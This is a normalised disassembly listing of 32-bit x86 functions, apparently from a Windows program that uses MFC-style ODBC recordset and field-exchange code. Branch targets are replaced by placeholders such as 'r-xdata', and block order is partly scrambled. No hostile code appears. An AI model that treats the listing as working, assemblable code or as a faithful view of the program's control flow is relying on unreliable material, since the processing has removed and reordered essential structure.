sub esp 0x38
push esi
mov esi ecx
mov eax [ esi + 0x94 ]
cmp eax 0x1
je r-xdata
push 0x0
push esi
push 0x4
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
cmp eax 0x2
jne r-xdata
pop esi
leave
retn
sub_423e20
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x5
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423e4a
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x8
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
test [ esi + 0x2d ] 0x2
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ esi ]
push ecx
mov ecx esi
je r-xdata
call [ eax + 0x40 ]
call [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
pop esi
leave
retn 0x8
sub_423e8a
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x9
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
mov eax [ ebp - 0x18 ]
pop esi
leave
retn 0xc
sub_423ec5
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0xa
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
mov eax [ ebp - 0x18 ]
pop esi
leave
retn 0xc
sub_423f00
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0xc
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423f24
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
call sub_423c5a
push 0x0
push esi
push 0xd
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423f4d
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x7
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423f71
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0x6
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423f95
push ebp
mov ebp esp
sub esp 0x38
push esi
mov esi ecx
push 0x0
push esi
push 0xe
lea ecx [ ebp - 0x38 ]
call sub_424393
mov eax [ esi ]
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
pop esi
leave
retn
sub_423fb9
push ecx
push ecx
push ebx
push ebp
mov ebx ecx
xor ebp ebp
mov [ esp + 0xc ] ebp
cmp [ ebx + 0x14 ] ebp
jbe r-xdata
pop ebp
pop ebx
pop ecx
pop ecx
retn
push esi
push edi
mov [ esp + 0x10 ] ebp
sub eax 0xa
je r-xdata
je r-xdata
mov edi [ esi ]
cmp edi ebp
je r-xdata
sub eax 0x5
je r-xdata
mov ecx [ esi ]
cmp ecx ebp
je r-xdata
cmp eax ebp
jle r-xdata
mov [ esi ] ebp
mov ecx edi
call sub_442148
push edi
push [ esi ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
jmp r-xdata
inc [ esp + 0x14 ]
add [ esp + 0x10 ] 0x10
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x14 ]
jb r-xdata
cmp eax 0x4
jle r-xdata
mov esi [ esp + 0x10 ]
add esi [ ebx + 0x3c ]
mov eax [ esi + 0x8 ]
cmp eax 0x9
jg r-xdata
pop edi
pop esi
call sub_441eb2
pop ecx
dec eax
cmp eax 0x6
je r-xdata
cmp eax 0x7
je r-xdata
cmp eax 0x8
jmp r-xdata
jne r-xdata
sub_42404b
mov eax sub_46354c
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
cmp [ esi + 0x94 ] 0x2
jne r-xdata
xor edi edi
cmp [ esi + 0xcc ] edi
jne r-xdata
xor edi edi
cmp [ esi + 0xd0 ] edi
jne r-xdata
cmp [ esi + 0xc8 ] edi
jne r-xdata
mov eax [ esi ]
push edi
push 0x3f1
mov ecx esi
call [ eax + 0x54 ]
cmp [ esi + 0x94 ] edi
je r-xdata
mov eax [ esi ]
push edi
push 0x3f1
jmp r-xdata
mov eax [ esi ]
push edi
push 0x3ef
cmp [ esi + 0xc4 ] edi
jne r-xdata
cmp [ esi + 0x28 ] edi
jne r-xdata
push edi
mov ecx esi
call sub_421bd9
test eax eax
je r-xdata
mov ecx esi
call [ eax + 0x54 ]
cmp [ esi + 0xe4 ] edi
je r-xdata
xor ebx ebx
cmp [ esi + 0xbc ] edi
mov ecx esi
sete bl
call sub_42362f
mov eax [ esi + 0x2c ]
mov ecx eax
and ecx 0x4000
je r-xdata
mov ecx esi
call sub_42359a
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp ecx edi
je r-xdata
cmp ebx edi
jne r-xdata
mov eax [ esi + 0x94 ]
mov [ ebp - 0x4 ] edi
sub eax edi
je r-xdata
mov ecx esi
call sub_4236a8
mov eax [ esi + 0x2c ]
test ah 0x80
je r-xdata
and ah 0xbf
or ah 0x80
mov [ esi + 0x2c ] eax
lea eax [ esi + 0xd8 ]
push r--data
push eax
mov ecx esi
push [ esi + 0xbc ]
call sub_423ec5
jmp r-xdata
mov edx [ esi + 0xa0 ]
cmp edx edi
jl r-xdata
dec eax
dec eax
jne r-xdata
mov ecx esi
call sub_42387e
and ah 0x7f
or ah 0x40
mov [ esi + 0x2c ] eax
push 0x1
mov ecx esi
pop eax
push eax
push edi
mov [ esi + 0xe4 ] eax
call sub_422118
mov ecx [ esi + 0x9c ]
lea eax [ esi + 0x9c ]
cmp ecx edi
jle r-xdata
mov [ esi + 0x94 ] edi
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0xc4 ] edi
mov [ esi + 0xc8 ] edi
cmp [ eax + 0xc ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x1c ] edi
je r-xdata
dec edx
mov [ esi + 0xa0 ] edx
dec ecx
mov [ eax ] ecx
cmp [ esi + 0x1c ] edi
je r-xdata
mov edx [ esi + 0xa0 ]
cmp edx edi
jl r-xdata
push 0x1
pop eax
test [ esi + 0x2d ] 0x40
jne r-xdata
cmp [ esi + 0x14 ] edi
jbe r-xdata
mov ecx [ esi + 0x9c ]
lea eax [ esi + 0x9c ]
cmp ecx 0xffffffff
je r-xdata
push edi
push edi
mov ecx esi
call sub_4220d2
mov ecx esi
call sub_423f24
jmp r-xdata
inc edx
mov [ esi + 0xa0 ] edx
inc ecx
mov [ eax ] ecx
sub_424231
mov cx [ esp + 0x4 ]
cmp cx 0xffff
je r-xdata
push 0x1
pop eax
cmp cx 0xfffc
je r-xdata
mov eax [ esp + 0x8 ]
inc eax
cmp cx 0x2
je r-xdata
inc eax
inc eax
jmp r-xdata
cmp cx 0x3
jne r-xdata
retn 0x8
sub_42425d
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call Ordinal_ODBC32_43
cmp ax 0x2
je r-xdata
cmp ax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x1c
cmp ax 0x64
jne r-xdata
test ax ax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x64
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4209c9
sub_4242ad
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
cmp eax ebx
jl r-xdata
mov ecx [ ebp + 0x20 ]
push eax
call sub_4425c7
mov eax [ ebp + 0x14 ]
cmp ebx eax
jg r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x20
cmp [ ebp + 0x24 ] 0xffff
je r-xdata
mov ecx [ ebp + 0x20 ]
dec ebx
push esi
inc eax
push edi
push eax
call sub_4425ef
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x18 ]
add eax ebx
sub esi ebx
mov [ edi ] eax
inc esi
cmp [ ebp + 0x24 ] 0xfffc
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
push esi
push [ edi ]
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call Ordinal_ODBC32_43
cmp ax 0x2
je r-xdata
pop edi
cmp ax 0x1
pop esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x20 ]
add ebx eax
push ebx
call sub_4425c7
test ax ax
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4209c9
sub_424359
cmp [ esp + 0x10 ] 0x64
je r-xdata
retn 0x10
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0xfffffffe
je r-xdata
mov edx [ esp + 0x4 ]
inc eax
mov ecx [ edx ]
cmp ecx eax
jle r-xdata
mov [ edx ] eax
mov eax ecx
sub_424393
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0xc ]
or [ eax + 0x8 ] 0xffffffff
mov [ eax + 0x18 ] ecx
xor ecx ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x2c ] ecx
mov ecx 0x10000
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
retn 0xc
sub_4243cf
xor edx edx
push esi
cmp [ ecx + 0x8 ] edx
jne r-xdata
inc [ ecx + 0x24 ]
mov eax [ ecx + 0x24 ]
inc [ ecx + 0x20 ]
mov eax [ ecx + 0x20 ]
jmp r-xdata
xor eax eax
cmp [ ecx + 0x8 ] edx
setne al
cmp eax 0x1
je r-xdata
mov esi [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ ecx ]
cmp eax edx
pop esi
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] edx
sete al
jmp r-xdata
retn 0x4
sub_42440c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov edi [ esi + 0x24 ]
mov edi [ esi + 0x20 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
jmp [ eax * 4 + jump_table_4246c2 ]
mov eax [ esi ]
cmp eax 0xd
ja r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ edi - 0x1 ]
push eax
call sub_423cdc
test eax eax
mov eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ esi + 0x4 ]
dec edi
push edi
call sub_423cdc
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
dec edi
push edi
call sub_423c6e
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
dec edi
push edi
call sub_423c6e
push [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push edi
push [ eax + 0x4 ]
call Ordinal_ODBC32_4
mov ecx [ esi + 0x4 ]
mov ebx eax
push ebx
mov eax [ ecx ]
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
dec edi
push edi
call sub_423c6e
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ edi - 0x1 ]
push eax
call sub_423c6e
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
lea ebx [ edi - 0x1 ]
push ebx
call sub_423c6e
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax edi
shl eax 0x4
mov edx [ ecx + 0x3c ]
test [ edx + eax - 0x4 ] 0x2
lea ebx [ edx + eax - 0x10 ]
je r-xdata
push [ ebp + 0xc ]
push edi
push [ esi + 0x4 ]
call sub_425363
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ esi + 0x4 ]
call sub_4253cf
mov ecx [ ebp + 0x18 ]
mov [ eax ] ecx
or [ eax ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x18 ]
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x4 ]
push edi
call sub_423ca5
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0xfffffffa
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx 0x40
mov ecx [ esi + 0x4 ]
push 0x0
push ebx
mov eax [ ecx ]
call [ eax + 0x54 ]
push [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
call sub_442524
push [ esi + 0x1c ]
mov ecx [ esi + 0x10 ]
call sub_442524
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx [ esi + 0x10 ]
call sub_442524
mov ecx [ esi + 0x10 ]
push 0x3d
call sub_44254b
mov ecx [ esi + 0x4 ]
push ebx
call sub_423ca5
mov ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
dec edi
push edi
call sub_423ca5
mov ecx [ ebx + 0x8 ]
cmp ecx 0x1
je r-xdata
dec edi
push edi
call sub_423ca5
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx 0x5c
jmp r-xdata
mov ecx [ esi + 0x4 ]
push [ esi + 0x2c ]
mov edx [ ecx ]
push eax
call [ edx + 0x54 ]
push eax
push ebx
push [ ebp + 0xc ]
mov ax [ esi + 0x8 ]
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x14 ]
push eax
push edi
push [ esi + 0x2c ]
call Ordinal_ODBC32_72
cmp ax bx
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebx ] eax
or [ ebx ] 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
cmp ecx 0x2
je r-xdata
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_43d586
mov [ eax ] edi
jmp r-xdata
mov ecx [ esi + 0x10 ]
push 0x3f
call sub_44254b
push [ esi + 0x1c ]
mov ecx [ esi + 0x10 ]
call sub_442524
mov eax [ esi + 0x4 ]
inc [ esi + 0x28 ]
shl edi 0x4
mov eax [ eax + 0x38 ]
push ebx
push 0x0
push [ ebp + 0xc ]
mov cx [ eax + edi - 0x4 ]
lea eax [ eax + edi - 0x10 ]
push ecx
push [ eax + 0x8 ]
mov ax [ eax + 0x4 ]
push eax
mov ax [ esi + 0x28 ]
push [ ebp + 0x14 ]
push 0x1
push eax
push [ esi + 0x2c ]
call Ordinal_ODBC32_72
test ax ax
je r-xdata
mov eax [ esi + 0x4 ]
test [ eax + 0x2d ] 0x40
jne r-xdata
mov ecx [ esi + 0x4 ]
push edi
call sub_423c81
push ecx
push ebx
push [ ebp + 0xc ]
call sub_425446
cmp ecx 0x3
je r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push [ esi + 0x2c ]
mov edx [ ecx ]
push eax
call [ edx + 0x54 ]
jmp r-xdata
mov ecx [ esi + 0x4 ]
push edi
call sub_423c6e
test eax eax
je r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
cmp ecx 0x4
je r-xdata
mov [ esi + 0x14 ] 0x1
jmp r-xdata
cmp ecx 0x6
je r-xdata
mov ebx [ ebx ]
sub_4246fa
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx esi
call sub_4243cf
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
mov eax [ ebp + 0x8 ]
push [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c0e
mov ebx eax
mov eax [ esi ]
cmp eax 0x7
ja r-xdata
sub eax 0xb
je r-xdata
je r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jne r-xdata
dec eax
je r-xdata
mov edi [ ebp + 0x10 ]
mov eax [ edi ]
cmp [ eax - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
jne r-xdata
xor edi edi
sub eax edi
je r-xdata
cmp eax [ ebp + 0x10 ]
jne r-xdata
cmp [ esi + 0x8 ] edi
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call sub_425363
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
jmp r-xdata
mov edi [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov ecx edi
call sub_4425ef
mov ecx edi
call sub_44260f
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
call sub_423cdc
push ebx
push [ ebp + 0x14 ]
neg eax
push [ ebp + 0x10 ]
sbb eax eax
push [ ebp + 0x1c ]
and eax 0x2
add eax 0xfffffffd
push [ ebp + 0x14 ]
mov [ ebx ] eax
mov ax [ esi + 0x8 ]
push [ ebp + 0x18 ]
push 0x1
push eax
push [ ebp + 0x8 ]
push [ esi + 0x2c ]
call Ordinal_ODBC32_72
push 0xffffffff
mov ecx edi
mov ebx eax
call sub_4425c7
test bx bx
je r-xdata
dec eax
dec eax
je r-xdata
cmp [ esi + 0x14 ] edi
mov eax [ ebp + 0x8 ]
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax edi
mov edx [ ecx + 0x3c ]
shl eax 0x4
dec edi
lea eax [ edx + eax - 0x10 ]
mov edx [ eax ]
mov al [ eax + 0xc ]
push eax
push edi
mov [ ebp + 0x14 ] edx
call sub_423c45
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423ca5
test eax eax
jne r-xdata
dec eax
je r-xdata
push [ ebp + 0x14 ]
mov eax [ edi ]
mov ecx esi
push [ eax - 0x8 ]
push 0x1
push ebx
push edi
push [ ebp + 0xc ]
call sub_42440c
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov ebx [ ebp + 0x8 ]
add ecx 0x5c
push edi
call sub_43d586
mov [ eax ] ebx
jmp r-xdata
mov ecx [ esi + 0x4 ]
push [ esi + 0x2c ]
mov eax [ ecx ]
push ebx
call [ eax + 0x54 ]
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
shl ecx 0x4
mov eax [ eax + 0x38 ]
lea ecx [ eax + ecx - 0x10 ]
mov eax [ ecx + 0x8 ]
movsx ecx [ ecx + 0x4 ]
add ecx 0x6
cmp ecx 0x12
ja r-xdata
sub eax 0x3
je r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov [ ebx ] 0xfffffffd
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov ecx [ ebp + 0x10 ]
push edi
call sub_4425ef
mov ecx [ ebp + 0x10 ]
push 0xffffffff
call sub_4425c7
or [ ebx ] 0xffffffff
jmp r-xdata
mov esi [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov ecx esi
call sub_442281
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
shl ecx 0x4
mov eax [ eax + 0x3c ]
push 0x4
lea esi [ eax + ecx - 0x10 ]
call sub_441e89
test eax eax
pop ecx
je r-xdata
mov edi [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov ecx edi
mov eax [ edi ]
mov eax [ eax - 0x8 ]
push eax
push 0x1
push ebx
push 0x0
call sub_442578
push eax
mov ecx esi
push [ ebp + 0xc ]
call sub_42440c
push 0xffffffff
mov ecx edi
jmp r-xdata
add eax 0xa
movzx ecx [ ecx + lookup_table_424aa2 ]
jmp [ ecx * 4 + jump_table_424a8e ]
cmp [ ebx ] 0xffffffff
jne r-xdata
dec eax
jne r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
jmp r-xdata
call sub_4425c7
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x100
jae r-xdata
inc eax
inc eax
jmp r-xdata
inc eax
jmp r-xdata
cmp eax [ ebp + 0x14 ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
push edi
call sub_442578
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0x8 ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov ecx [ ebp + 0x10 ]
push edi
call sub_4425ef
mov ecx [ ebp + 0x10 ]
push 0xffffffff
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
cmp [ eax - 0x8 ] edi
je r-xdata
mov [ esi ] eax
mov [ esi + 0x8 ] 0xa
jmp r-xdata
mov ecx [ esi + 0x4 ]
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
add ecx 0x40
call sub_43d586
mov [ eax ] edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
push 0x0
push edi
mov eax [ ecx ]
call [ eax + 0x54 ]
mov ecx [ ebp + 0x10 ]
lea edi [ eax + 0x1 ]
push edi
call sub_4425ef
mov ecx [ ebp + 0x10 ]
call sub_44260f
push ebx
push edi
push eax
mov eax [ esi + 0x4 ]
push 0x1
push [ ebp + 0x8 ]
push [ eax + 0x4 ]
call Ordinal_ODBC32_4
mov ecx [ ebp + 0x10 ]
push 0xffffffff
mov edi eax
call sub_4425c7
mov ecx [ esi + 0x4 ]
push edi
mov eax [ ecx ]
call [ eax + 0x48 ]
test eax eax
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0xffffffff
mov ecx esi
call sub_4425c7
jmp r-xdata
mov cl [ eax ]
xor esi esi
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c81
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
jmp r-xdata
mov eax [ esi ]
mov eax [ eax - 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp cl 0x20
je r-xdata
cmp esi edi
jne r-xdata
xor esi esi
jmp r-xdata
push eax
call sub_42e14b
pop ecx
mov cl [ eax ]
test cl cl
jne r-xdata
mov esi eax
cmp esi edi
je r-xdata
and [ esi ] cl
sub_424ab5
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx esi
call sub_4243cf
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c0e
mov ebx [ ebp + 0x10 ]
mov edi eax
mov eax [ esi ]
dec eax
dec eax
je r-xdata
push 0xa
push 0x4
push 0x4
push edi
push ebx
mov ecx esi
push [ ebp + 0xc ]
call sub_42440c
sub eax 0x3
je r-xdata
cmp [ edi ] 0xffffffff
jne r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x4a4d4120
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x4a4d4120
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c81
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
jmp r-xdata
cmp [ ebx ] 0x4a4d4120
je r-xdata
push 0x4
pop ecx
sub eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov eax [ esi + 0x18 ]
mov ebx [ ebp + 0x10 ]
test eax eax
jne r-xdata
sub eax 0x3
jne r-xdata
cmp eax ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
shl edx 0x4
mov eax [ eax + 0x3c ]
mov [ eax + edx - 0x8 ] ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov [ edi ] 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov [ ebx ] 0x4a4d4120
or [ edi ] 0xffffffff
jmp r-xdata
sub_424bd7
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx esi
call sub_4243cf
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c0e
push 0x2
mov edi eax
mov eax [ esi ]
pop ebx
sub eax ebx
je r-xdata
push 0x1
push 0x4
push 0xfffffff9
push edi
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
call sub_42440c
sub eax 0x3
je r-xdata
cmp [ edi ] 0xffffffff
jne r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] ebx
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c81
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] ebx
je r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
sub eax 0x3
jne r-xdata
cmp eax [ ebp + 0x10 ]
jne r-xdata
cmp [ esi + 0x8 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
shl ecx 0x4
mov eax [ eax + 0x3c ]
mov [ eax + ecx - 0x8 ] 0x1
jmp r-xdata
cmp [ esi + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cca
mov [ edi ] 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cb8
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
or [ edi ] 0xffffffff
jmp r-xdata
sub_424cfa
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx esi
call sub_4243cf
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
push [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423c0e
mov ebx eax
mov eax [ esi ]
cmp eax 0xe
mov [ ebp - 0x4 ] ebx
ja r-xdata
push 0x17
push 0x4
push 0xb
push ebx
push [ ebp + 0x10 ]
jmp [ eax * 4 + jump_table_425319 ]
mov eax [ esi + 0x4 ]
mov [ eax + 0x20 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cdc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
dec eax
push eax
call sub_423cdc
neg eax
sbb eax eax
xor edi edi
